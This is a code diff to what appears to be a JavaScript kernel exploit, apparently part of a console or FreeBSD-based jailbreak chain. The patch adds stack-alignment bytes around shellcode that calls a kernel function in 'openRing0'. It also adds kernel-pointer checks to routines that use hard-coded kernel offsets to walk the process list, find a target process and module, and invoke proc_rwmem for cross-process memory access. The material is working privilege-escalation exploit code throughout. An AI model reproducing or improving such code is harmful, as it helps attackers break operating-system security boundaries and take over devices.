@@ -727,7 +727,9 @@ function openRing0(roomAt) {
     c.hex("48bf").qw(process);
     c.hex("48be").qw(uio);
     c.hex("48b8").qw(functionAddress);
+    c.hex("4883ec08");
     c.hex("ffd0");
+    c.hex("4883c408");
     c.hex("48ba").qw(plus(this.at, OUT));
     c.hex("488902");
     if (!this.run()) return -1;
@@ -2269,6 +2271,10 @@ async function attempt(ctx, opts) {
     return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0);
   }
 
+  function isKernelPointer(q) {
+    return !isNull64(q) && (q.hi >>> 0) === 0xffffffff;
+  }
+
   function readKernelCString(at, max) {
     const bytes = k.read(at, max);
     if (!bytes) return "";
@@ -2282,10 +2288,10 @@ async function attempt(ctx, opts) {
 
   function findProcessByName(name) {
     const allproc = k.read_v(kat(0x01b28538));
-    if (isNull64(allproc)) return null;
+    if (!isKernelPointer(allproc)) return null;
     let current = allproc;
     let found = null;
-    for (let i = 0; i < 2048 && !isNull64(current); i++) {
+    for (let i = 0; i < 2048 && isKernelPointer(current); i++) {
       const comm = readKernelCString(plus(current, 0x454), 32);
       if (comm === name) {
         if (found) return null;
@@ -2320,10 +2326,10 @@ async function attempt(ctx, opts) {
     const target = findProcessByName(processName);
     if (isNull64(target)) return null;
     const vmspace = k.read_v(plus(target, 0x168));
-    if (isNull64(vmspace)) return null;
+    if (!isKernelPointer(vmspace)) return null;
     let entry = k.read_v(plus(vmspace, 8));
     let match = null;
-    for (let i = 0; i < 4096 && !isNull64(entry); i++) {
+    for (let i = 0; i < 4096 && isKernelPointer(entry); i++) {
       const name = readKernelCString(plus(entry, 0x8d), 32);
       if (name.indexOf(moduleName) !== -1) {
         const start = k.read_v(plus(entry, 0x20));
@@ -2373,7 +2379,8 @@ async function attempt(ctx, opts) {
 
     const procRwmem = plus(kbase, 0x00366d80);
     const functionBytes = k.read(procRwmem, 8);
-    if (!functionBytes || functionBytes.every(byte => byte === 0))
+    if (!inText(procRwmem) || !functionBytes ||
+        functionBytes.every(byte => byte === 0))
       return false;
     const result = k.callProcRw(target, uio.at, procRwmem);
     const remainingLow = uio.dv.getUint32(0x18, true);
